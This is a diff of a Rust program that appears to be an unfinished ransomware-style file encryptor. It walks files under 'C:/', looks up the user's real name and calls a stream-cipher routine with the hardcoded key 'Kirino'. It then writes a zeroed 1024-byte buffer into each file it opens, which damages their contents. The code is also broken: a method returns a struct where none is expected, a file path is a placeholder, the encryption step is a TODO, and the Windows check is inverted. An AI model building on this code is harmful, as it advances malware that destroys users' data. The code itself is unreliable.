@@ -1,4 +1,4 @@
-use std::path::PathBuf;
+use std::{io::Write, path::PathBuf};
 use thiserror::Error;
 use seekable_stream_cipher::keccak::StreamCipher;
 use std::fs::File;
@@ -11,23 +11,25 @@ pub enum FileError {
     NotVaildKey
 }
 
-#[derive(Debug)]
-struct Encrypt;
+
+struct Encrypt{
+    target: File,
+    encrypted: String, // [u8] 
+}
 
 impl Encrypt {
     fn new() -> Self{
-        Self
+        let file= match File::create("path"){
+            Ok(file) => file,
+            Err(e) => panic!("not found file path"),
+        };
+
+        Self { target: file, encrypted: String::new() }
     }
 
-    fn set_offset(&mut self, off_set: String) -> Self{
-        Self
-    }
-
-    fn target(&mut self, file: File) -> Self{
-        Self
-    }
-    fn run(&mut self){
-
+    fn run (&mut self, file: &File, off_set: String) {
+        
+        Encrypt
     }
 }
 
@@ -41,7 +43,7 @@ fn get_file_names(path: &str) -> std::io::Result<Vec<String>> {
 }
 
 fn main() -> std::io::Result<()>{
-    // if !(cfg!(windows)) {
+    if !(cfg!(windows)) {
         let who_am_i= match whoami::realname(){
             Ok(string) => string,
             Err(err) => err.to_string()
@@ -60,7 +62,6 @@ fn main() -> std::io::Result<()>{
         
         for file_name in v_file_names {
             let mut pathbuf= PathBuf::from("C:/");
-            let mut data_buff: Box<[u8; 1024]> = Box::new([0u8; 1024]);
             
             pathbuf.push(file_name);
             
@@ -69,18 +70,21 @@ fn main() -> std::io::Result<()>{
                 Err(os_string) => panic!("[failed] getting string_pathbuf"), 
             };
 
-            let file= File::open(string_pathbuf)?;
+            let mut file= File::open(string_pathbuf)?;
 
             // seekable_stream_cipher
             let mut encrypted= Encrypt::new();
-            encrypted
-                .set_offset("Kirino".to_string())
-                .target(file)
-                .run();
+            {
+                let offset= "Kirino".to_string();
+                encrypted.run(&file, offset);
+            }
 
-            std::io::Write(&mut data_buff as *mut Box<_>); 
+            let mut data_buff: [u8; 1024] = [0u8; 1024];
+            
+            // @TODO add enccrypted -> data_buff
+            
+            file.write_all(&data_buff)?;
         }
-
-    // }
+    }
     Ok(())
 }
